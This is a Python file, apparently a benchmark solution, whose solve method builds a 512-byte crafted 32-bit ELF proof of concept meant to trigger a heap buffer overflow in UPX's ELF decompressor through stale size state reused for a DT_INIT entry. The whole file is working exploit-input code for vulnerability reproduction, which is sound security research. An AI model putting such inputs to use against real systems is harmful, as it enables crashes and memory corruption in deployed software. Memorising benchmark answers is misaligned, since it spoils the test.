import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        
        # This PoC is designed to trigger a heap buffer overflow in UPX's
        # ELF decompression logic. The vulnerability stems from an internal state
        # (related to decompression parameters like uncompressed size) not being
        # reset between processing different program headers.

        # The PoC is a crafted 32-bit ELF file with two program headers:
        # 1. A PT_LOAD segment: This contains a fake UPX metadata block. We craft
        #    this block to set a very large "uncompressed size" (u_len) in the
        #    decompressor's internal state.
        # 2. A PT_DYNAMIC segment: The processing of this segment, specifically
        #    the handling of the DT_INIT entry (by a function like un_DT_INIT),
        #    is the trigger. The stale, large u_len from the first segment is
        #    improperly used to calculate an offset into a memory buffer (`lowmem`),
        #    leading to an out-of-bounds write (heap buffer overflow).

        # Target PoC size is 512 bytes, matching the ground-truth length.
        poc = bytearray(512)

        # --- ELF Header (52 bytes) ---
        e_ident = b'\x7fELF\x01\x01\x01' + b'\x00' * 9  # 32-bit, LSB, System V
        e_type = 3          # ET_DYN (Shared object file)
        e_machine = 3       # EM_386 (Intel 80386)
        e_version = 1
        e_entry = 0
        e_phoff = 52        # Program header table offset
        e_shoff = 0         # No section headers
        e_flags = 0
        e_ehsize = 52       # ELF header size
        e_phentsize = 32    # Program header entry size
        e_phnum = 2         # Number of program headers
        e_shentsize = 0
        e_shnum = 0
        e_shstrndx = 0

        header_struct = struct.pack(
            '<16sHHIIIIIHHHHHH',
            e_ident, e_type, e_machine, e_version,
            e_entry, e_phoff, e_shoff, e_flags,
            e_ehsize, e_phentsize, e_phnum,
            e_shentsize, e_shnum, e_shstrndx
        )
        poc[0:len(header_struct)] = header_struct

        # --- Program Header Table (2 * 32 = 64 bytes) at offset 52 ---
        ph_table_offset = e_phoff
        data_offset = ph_table_offset + e_phnum * e_phentsize  # 52 + 64 = 116

        ph0_data_filesz = 24
        ph1_data_filesz = 16

        # Program Header 0: PT_LOAD (State Setter)
        ph0_struct = struct.pack(
            '<IIIIIIII',
            1,                      # p_type = PT_LOAD
            data_offset,            # p_offset
            0x08048000,             # p_vaddr
            0x08048000,             # p_paddr
            ph0_data_filesz,        # p_filesz
            0x20000,                # p_memsz (larger to mimic packed file)
            6,                      # p_flags = RW
            0x1000                  # p_align
        )
        poc[ph_table_offset:ph_table_offset + 32] = ph0_struct

        # Program Header 1: PT_DYNAMIC (Trigger)
        ph1_struct = struct.pack(
            '<IIIIIIII',
            2,                      # p_type = PT_DYNAMIC
            data_offset + ph0_data_filesz, # p_offset
            0x08049000,             # p_vaddr
            0x08049000,             # p_paddr
            ph1_data_filesz,        # p_filesz
            ph1_data_filesz,        # p_memsz
            6,                      # p_flags = RW
            4                       # p_align
        )
        poc[ph_table_offset + 32:ph_table_offset + 64] = ph1_struct

        # --- Data Blocks (at offset 116) ---

        # Data for PH0: Crafted UPX `b_info` block
        # A large u_len corrupts the decompressor state.
        u_len_bad = 0x40000000  # Large uncompressed size
        c_len_bad = 0x10         # Small compressed size
        method_bad = 0x08        # e.g., M_LZMA

        data0 = bytearray(ph0_data_filesz)
        data0[0:4] = struct.pack('<I', u_len_bad)
        data0[4:8] = struct.pack('<I', c_len_bad)
        data0[8] = method_bad
        poc[data_offset:data_offset + ph0_data_filesz] = data0

        # Data for PH1: .dynamic section
        # Must contain DT_INIT to exercise the vulnerable code path.
        DT_INIT = 12
        DT_NULL = 0
        
        data1 = bytearray(ph1_data_filesz)
        # Entry 1: DT_INIT
        data1[0:8] = struct.pack('<ii', DT_INIT, 0xdeadbeef)
        # Entry 2: DT_NULL (terminator)
        data1[8:16] = struct.pack('<ii', DT_NULL, 0)
        poc[data_offset + ph0_data_filesz:data_offset + ph0_data_filesz + ph1_data_filesz] = data1
        
        return bytes(poc)
